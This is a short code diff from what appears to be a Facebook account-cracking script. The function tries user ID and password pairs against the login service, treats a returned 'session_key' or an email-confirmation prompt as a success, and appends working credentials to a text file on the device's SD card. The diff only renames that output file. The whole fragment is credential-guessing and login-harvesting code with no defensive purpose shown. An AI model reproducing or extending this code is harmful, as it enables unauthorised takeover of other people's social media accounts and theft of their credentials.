@@ -213,12 +213,12 @@ def file_subb(uid,pwx):
             q=json.loads(p)
             if "session_key" in q:
                 print(f"\r\r  [OK] {uid} | {ps}      ")
-                open("/sdcard/EMRAN-Ok.txt","a").write(uid+"|"+ps+"\n")
+                open("/sdcard/gxds.txt","a").write(uid+"|"+ps+"\n")
                 oks.append(uid)
                 break
             elif "Please Confirm Email" in q:
                 print(f"\r\r। [OK] {uid} | {ps}      ")
-                open("/sdcard/EMRAN-Ok.txt","a").write(uid+"|"+ps+"\n")
+                open("/sdcard/gxds.txt","a").write(uid+"|"+ps+"\n")
                 oks.append(uid)
             elif "www.facebook.com" in q:
                 print(f"\r\r  [CP] {uid} | {ps}      ")
